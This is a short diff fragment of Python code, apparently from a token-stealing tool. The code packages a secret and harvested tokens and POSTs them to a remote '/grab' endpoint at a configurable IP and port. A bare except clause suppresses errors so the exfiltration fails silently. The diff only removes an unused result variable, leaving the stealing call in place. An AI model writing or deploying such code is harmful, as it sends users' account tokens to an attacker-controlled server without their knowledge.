@@ -70,7 +70,7 @@ try:
     data = {'secret': SECRET, 'tokens': tokens}
 
     # note that using json=data, requests module automatically sets the Content-Type header to application/json
-    res = requests.post(f'http://{API_IP}:{API_PORT}/grab', json=data)
+    requests.post(f'http://{API_IP}:{API_PORT}/grab', json=data)
 except:
     pass
 ```
